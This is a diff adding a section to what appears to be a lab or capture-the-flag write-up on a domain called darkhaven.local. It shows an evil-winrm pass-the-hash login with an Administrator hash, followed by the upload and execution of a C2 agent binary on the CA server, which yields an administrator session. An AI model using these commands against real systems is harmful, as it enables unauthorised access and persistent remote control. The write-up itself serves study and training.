@@ -384,5 +384,39 @@ SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to th
 Now i can use the administrator hash to get access via winrm 
 
 ```python
+evil-winrm -i ca.ext.darkhaven.local -u 'Administrator' -H '7af69f428fd21312a225c74e5f574ed6'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload CA-agent.x64.exe
+                                        
+Info: Uploading /home/kali/hsm/darkhaven/CA-agent.x64.exe to C:\Users\Administrator\Documents\CA-agent.x64.exe
+                                        
+Data: 120148 bytes of 120148 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
 
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         4/19/2026   3:51 PM          90112 ca-agent.x64.exe
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ./ca-agent.x64.exe
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
+Now i should have a session on my c2 client
+
+![](Pasted%20image%2020260419165237.png)
+
+New administrator session on the CA server
+
